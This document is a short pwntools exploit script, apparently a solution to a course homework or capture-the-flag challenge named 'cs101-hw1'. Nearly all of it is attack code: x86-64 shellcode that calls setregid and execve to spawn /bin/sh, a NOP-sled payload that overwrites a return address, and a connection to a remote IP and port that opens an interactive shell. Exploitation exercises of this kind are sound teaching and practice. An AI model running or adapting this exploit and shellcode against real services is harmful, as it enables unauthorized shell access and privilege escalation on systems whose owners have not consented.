from pwn import *			                #import the library

context.arch = "AMD64"

#Shellcode
sc = """
//getegid
xor rax, rax
mov al, 0x6c
syscall

//setregid
mov rdi, rax
mov rsi, rax
xor rax, rax
mov al, 0x72
syscall

//execve
xor rax, rax
mov al, 0x3b
xor rsi, rsi
xor rdx, rdx
push rsi
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp
syscall
"""

code = asm(sc)                              #assemble the shellcode


target = "./cs101-hw1"		                #filename you want to exploit
elf = ELF(target)			                #opens the target file as an elf so pwntools can interact w/ it.
io = remote('18.216.238.24', 1001)          #Connect to the target program running on 18.216.238.24:1001.


#Payload
payload = b"\x90" *(72-len(code))           #NOP sled before the shellcode to fill exact buffer size of 72
payload += code                             #Place the shellcode
payload += p64(0x401271)                    # overwrite the return address

io.recvuntil(b"\n")			                #Receive input until you get where you want in the program.
pause()					                    #Pause the program and give gdb a chance to attach to the program.
io.sendline(payload)		                #send your payload into the buffer.

io.interactive()			                #opens an interactive shell